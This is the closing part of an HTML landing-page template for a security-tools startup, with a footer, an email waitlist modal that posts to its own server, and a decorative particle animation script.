                        <h6 class="text-xs font-semibold text-[var(--text-primary)] tracking-wide uppercase mb-5">
                            Support
                        </h6>
                        <ul class="space-y-3 list-none p-0">
                            <li><a href="mailto:shkshafi@offensivesecuritylabs.com" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors text-decoration-none">hello@offsec.com</a></li>
                        </ul>
                    </div>
                </div>

                <div class="flex flex-col sm:flex-row justify-between items-center gap-4 pt-6 border-t border-[var(--border)]">
                    <p class="text-xs text-[var(--text-secondary)]">© 2026 Offensive Security Labs. All rights reserved.</p>
                    <div class="flex items-center gap-4">
                        <a href="https://github.com/shkshafi" class="text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors" aria-label="GitHub">
                            <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
                        </a>
                        <a href="https://x.com/shkshafi" class="text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors" aria-label="Twitter">
                            <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"/></svg>
                        </a>
                        <a href="https://www.linkedin.com/in/shkshafi" class="text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors" aria-label="LinkedIn">
                            <svg class="size-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
                        </a>
                    </div>
                </div>
            </div>

            <div class="landing-footer-giant">
                <div class="landing-footer-giant-text">offsec labs</div>
            </div>
        </footer>
        <!-- Waitlist Modal -->
        <div x-show="showWaitlist" 
             x-transition:enter="transition ease-out duration-300"
             x-transition:enter-start="opacity-0 scale-95"
             x-transition:enter-end="opacity-100 scale-100"
             x-transition:leave="transition ease-in duration-200"
             x-transition:leave-start="opacity-100 scale-100"
             x-transition:leave-end="opacity-0 scale-95"
             class="fixed inset-0 z-50 flex items-center justify-center p-4"
             style="display: none;">
            
            <!-- Backdrop -->
            <div class="fixed inset-0 bg-black/60 backdrop-blur-md" @click="showWaitlist = false"></div>

            <!-- Modal Content Card -->
            <div class="relative w-full max-w-md bg-[#0a0a0f]/90 border border-white/10 rounded-2xl p-6 shadow-2xl overflow-hidden">
                <!-- Glowing background effect inside the card -->
                <div class="absolute -top-24 -left-24 w-48 h-48 bg-purple-500/20 rounded-full blur-3xl pointer-events-none"></div>
                <div class="absolute -bottom-24 -right-24 w-48 h-48 bg-blue-500/20 rounded-full blur-3xl pointer-events-none"></div>

                <!-- Close Button -->
                <button @click="showWaitlist = false" class="absolute top-4 right-4 text-zinc-400 hover:text-white transition-colors cursor-pointer bg-transparent border-none">
                    <svg class="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <div class="relative z-10 text-center">
                    <!-- Icon -->
                    <div class="inline-flex items-center justify-center w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-400 mb-4">
                        <svg class="size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
                        </svg>
                    </div>

                    <h3 class="text-xl font-bold text-white mb-2 font-brand">Join the Waitlist</h3>
                    <p class="text-xs text-zinc-400 mb-6 font-sans">Consolidate your security workflows. Be the first to get access when public spots open.</p>

                    <!-- Form / Success message -->
                    <div x-show="!success">
                        <form @submit.prevent="
                            if (!email) return;
                            loading = true;
                            error = '';
                            fetch('/waitlist', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                                },
                                body: JSON.stringify({ email: email })
                            })
                            .then(res => res.json().then(data => ({ status: res.status, body: data })))
                            .then(res => {
                                loading = false;
                                if (res.status === 200 || res.status === 201) {
                                    success = true;
                                    error = '';
                                } else {
                                    error = res.body.message || (res.body.errors && res.body.errors.email ? res.body.errors.email[0] : 'Something went wrong. Please try again.');
                                }
                            })
                            .catch(err => {
                                loading = false;
                                error = 'Connection error. Please try again.';
                            })
                        " class="space-y-4">
                            <div>
                                <input type="email" 
                                       x-model="email" 
                                       required 
                                       placeholder="Enter your security email" 
                                       class="w-full px-4 py-3 bg-zinc-950/50 border border-white/10 rounded-xl text-sm text-white placeholder-zinc-500 focus:outline-none focus:border-purple-500 transition-all font-sans"
                                       :disabled="loading">
                            </div>
                            
                            <div x-show="error" x-text="error" class="text-xs text-red-400 text-left pt-1 font-sans"></div>

                            <button type="submit" 
                                    class="w-full py-3 rounded-xl bg-gradient-to-r from-purple-500 to-blue-500 hover:brightness-110 text-white font-semibold text-sm transition-all shadow-[0_4px_12px_-4px_rgba(139,92,246,0.5)] cursor-pointer flex items-center justify-center border-none"
                                    :disabled="loading">
                                <span x-show="!loading">Join Waitlist</span>
                                <span x-show="loading" class="flex items-center gap-2">
                                    <svg class="animate-spin h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    Adding to list...
                                </span>
                            </button>
                        </form>
                    </div>

                    <!-- Success State -->
                    <div x-show="success" x-transition class="space-y-4 py-4" style="display: none;">
                        <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 mx-auto">
                            <svg class="size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
                            </svg>
                        </div>
                        <h4 class="text-lg font-semibold text-white font-brand">You're on the list!</h4>
                        <p class="text-xs text-zinc-400 max-w-xs mx-auto font-sans">
                            Thank you for your interest. We have registered <span class="text-purple-400 font-medium" x-text="email"></span> and will contact you as soon as early access spots become available.
                        </p>
                        <button @click="showWaitlist = false; success = false; email = '';" class="mt-4 px-6 py-2 rounded-xl bg-zinc-900 border border-white/5 hover:bg-zinc-800 text-xs text-zinc-300 transition-all cursor-pointer font-sans">
                            Close
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Particles Animation Logic -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const canvas = document.getElementById('particles-canvas');
            if (canvas) {
                const ctx = canvas.getContext('2d');
                let circles = [];
                let width = 0;
                let height = 0;
                const quantity = 50;
                const color = '#8b5cf6';
                
                const hexToRgb = (hex) => {
                    hex = hex.replace('#', '');
                    if (hex.length === 3) hex = hex.split('').map(c => c+c).join('');
                    const num = parseInt(hex, 16);
                    return [(num >> 16) & 255, (num >> 8) & 255, num & 255];
                };
                const rgb = hexToRgb(color);
                
                const mouse = { x: 0, y: 0, targetX: 0, targetY: 0 };
                window.addEventListener('mousemove', (e) => {
                    const rect = canvas.getBoundingClientRect();
                    mouse.targetX = e.clientX - rect.left - width / 2;
                    mouse.targetY = e.clientY - rect.top - height / 2;
                });
                
                const initCanvas = () => {
                    width = canvas.parentElement.offsetWidth;
                    height = canvas.parentElement.offsetHeight;
                    
                    const dpr = window.devicePixelRatio || 1;
                    canvas.width = width * dpr;
                    canvas.height = height * dpr;
                    canvas.style.width = `${width}px`;
                    canvas.style.height = `${height}px`;
                    ctx.scale(dpr, dpr);
                    
                    circles = [];
                    for (let i = 0; i < quantity; i++) {
                        circles.push(createCircle());
                    }
                };
                
                const createCircle = () => {
                    return {
                        x: Math.random() * width,
                        y: Math.random() * height,
                        translateX: 0,
                        translateY: 0,
                        size: Math.random() * 1.5 + 0.4,
                        alpha: 0,
                        targetAlpha: Math.random() * 0.4 + 0.05,
                        dx: (Math.random() - 0.5) * 0.08,
                        dy: (Math.random() - 0.5) * 0.08,
                        magnetism: 0.1 + Math.random() * 3
                    };
                };
                
                const animate = () => {
                    ctx.clearRect(0, 0, width, height);
                    
                    mouse.x += (mouse.targetX - mouse.x) * 0.05;
                    mouse.y += (mouse.targetY - mouse.y) * 0.05;
                    
                    circles.forEach((c, index) => {
                        const edges = [c.x, width - c.x, c.y, height - c.y];
                        const minEdge = Math.min(...edges);
                        if (minEdge > 20) {
                            if (c.alpha < c.targetAlpha) c.alpha += 0.01;
                        } else {
                            c.alpha = c.targetAlpha * (minEdge / 20);
                        }
                        
                        c.x += c.dx;
                        c.y += c.dy;
                        c.translateX += (mouse.x / (50 / c.magnetism) - c.translateX) * 0.05;
                        c.translateY += (mouse.y / (50 / c.magnetism) - c.translateY) * 0.05;
                        
                        ctx.beginPath();
                        ctx.arc(c.x + c.translateX, c.y + c.translateY, c.size, 0, 2 * Math.PI);
                        ctx.fillStyle = `rgba(${rgb[0]}, ${rgb[1]}, ${rgb[2]}, ${c.alpha})`;
                        ctx.fill();
                        
                        if (c.x < -c.size || c.x > width + c.size || c.y < -c.size || c.y > height + c.size) {
                            circles[index] = createCircle();
                        }
                    });
                    
                    requestAnimationFrame(animate);
                };
                
                window.addEventListener('resize', initCanvas);
                initCanvas();
                animate();
            }

            // Scroll reveal animation handler
            const reveals = document.querySelectorAll('.landing-reveal');
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('is-visible');
                        observer.unobserve(entry.target);
                    }
                });
            }, { rootMargin: '-80px', threshold: 0.1 });

            reveals.forEach(r => observer.observe(r));
        });
    </script>
</body>
</html>
